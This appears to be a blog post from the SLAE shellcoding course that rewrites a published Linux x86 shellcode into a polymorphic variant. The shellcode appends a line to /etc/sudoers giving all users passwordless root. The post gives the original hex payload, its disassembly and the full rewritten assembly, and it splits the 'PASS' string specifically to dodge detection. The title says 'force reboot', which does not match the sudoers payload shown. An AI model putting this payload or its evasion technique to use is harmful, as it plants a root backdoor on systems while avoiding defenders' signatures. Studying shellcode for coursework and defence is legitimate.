---
layout: post
title: SLAE 6.3 - Shell-Storm Polymorphism - force reboot
date:   2019-03-06
categories: [SLAE, Assembly]
---
The 3rd shellcode we will try to make a polymorphic version of will be:\
http://shell-storm.org/shellcode/files/shellcode-62.php\
The length is 86 bytes giving us a maximum of 129 bytes.

Let's chec the shellcode:
```nasm
echo -ne "\x31\xc0\x50\x68\x6f\x65\x72\x73\x68\x2f\x73\x75\x64\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xb0\x05\xcd\x80\x89\xc3\x31\xc0\x50\x68\x41\x4c\x4c\x0a\x68\x57\x44\x3a\x20\x68\x50\x41\x53\x53\x68\x29\x20\x4e\x4f\x68\x28\x41\x4c\x4c\x68\x41\x4c\x4c\x3d\x68\x41\x4c\x4c\x20\x89\xe1\xb2\x1c\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x31\xdb\xb0\x01\xcd\x80" | ndisasm -u -
00000000  31C0              xor eax,eax
00000002  50                push eax
00000003  686F657273        push dword 0x7372656f
00000008  682F737564        push dword 0x6475732f
0000000D  682F657463        push dword 0x6374652f     ; /etc/sudoers
00000012  89E3              mov ebx,esp
00000014  66B90104          mov cx,0x401
00000018  B005              mov al,0x5
0000001A  CD80              int 0x80                  ; call open
0000001C  89C3              mov ebx,eax
0000001E  31C0              xor eax,eax
00000020  50                push eax
00000021  68414C4C0A        push dword 0xa4c4c41
00000026  6857443A20        push dword 0x203a4457
0000002B  6850415353        push dword 0x53534150
00000030  6829204E4F        push dword 0x4f4e2029
00000035  6828414C4C        push dword 0x4c4c4128
0000003A  68414C4C3D        push dword 0x3d4c4c41
0000003F  68414C4C20        push dword 0x204c4c41       ; ALL ALL=(ALL) NOPASSWD: ALL\n
00000044  89E1              mov ecx,esp
00000046  B21C              mov dl,0x1c
00000048  B004              mov al,0x4
0000004A  CD80              int 0x80                     ; call write
0000004C  B006              mov al,0x6
0000004E  CD80              int 0x80                     ; call close
00000050  31DB              xor ebx,ebx
00000052  B001              mov al,0x1
00000054  CD80              int 0x80                      ; call exit
```
So we have push "/etc/sudoers", call open\
Push "ALL ALL=(ALL) NOPASSWD: ALL\n", call write

call close, call exit.  Looks good!  Let's start our attempt at polymorphic code.

So let's 0 out eax and push it to the stack.  We are going to subtract eax from itself to get 0, we will move that value to the stack pointer and update the stack pointer ourselves.
```nasm
sub eax, eax
sub esp, 4
mov [esp], eax
```
Next we will push "/etc/sudoers" to the stack and update ebx to the stack pointer.
```nasm
push word 0x7372
push word 0x656f
push word 0x6475
push word 0x732f
push dword 0x6374652f
sub ebx, ebx
add ebx, esp
```
Setting up ecx and eax, 
```nasm
and ecx, eax
add cx, 0x401
add al, 0x5
int 0x80
```
Next we move the return value into ebx 0 out eax push the null value, then we will break up the PASS in our stack string hoping it will break up any detection on the string.\
```nasm
xchg ebx, eax
sub eax, eax
sub esp, 4
mov [esp], eax
push dword 0xa4c4c41
push dword 0x203a4457
push word 0x5353
push word 0x4150
push dword 0x4f4e2029
push dword 0x4c4c4128
push dword 0x3d4c4c41
push dword 0x204c4c41
sub ecx, ecx
add ecx, esp
```
Next we need to set up the rest of the args, edx and eax then make the call.\
My edx was not zero'd out here and would not work without adding an instruction to make sure edx = 0x1c
```nasm
xor edx, edx
mov dl, 0x1c
add al, 0x4
int 0x80
```
Then we need to update al for the close call.
```nasm
mov al, 0x6
int 0x80
```
Last call we need to zero out ebx and make eax = 1.
```nasm
mov al, 0x1
sub ebx, ebx
int 0x80
```
Here is the final outcome:
```nasm
xor eax,eax                             sub eax, eax
push eax                                sub esp, 0x4
                                        mov [esp], eax
push dword 0x7372656f                   push word 0x7372
                                        push word 0x656f
push dword 0x6475732f                   push word 0x6475
                                        push word 0x732f
push dword 0x6374652f                   push dword 0x6374652f   
mov ebx,esp                             sub ebx, ebx
                                        add ebx, esp
mov cx,0x401                            and ecx, eax
                                        add cx ,0x401
mov al,0x5                              add al, 0x5
int 0x80                                int 0x80                
mov ebx,eax                             xchg ebx, eax
xor eax,eax                             sub eax, eax
push eax                                sub esp, 0x4
                                        mov [esp], eax
push dword 0xa4c4c41                    push dword 0xa4c4c41
push dword 0x203a4457                   push dword 0x203a4457
push dword 0x53534150                   push word 0x5353
                                        push word 0x4150
push dword 0x4f4e2029                   push dword 0x4f4e2029
push dword 0x4c4c4128                   push dword 0x4c4c4128
push dword 0x3d4c4c41                   push dword 0x3d4c4c41
push dword 0x204c4c41                   push dword 0x204c4c41
mov ecx,esp                             sub ecx, ecx
                                        add ecx, esp
mov dl,0x1c                             xor edx, edx
                                        mov dl, 0x1c
mov al,0x4                              add al, 0x4
int 0x80                                int 0x80
mov al,0x6                              mov al, 0x6
int 0x80                                int 0x80
xor ebx,ebx                             mov al, 0x1
mov al,0x1                              sub ebx, ebx
int 0x80                                int 0x80
```
Our total length of the new shellcode is 113 bytes!
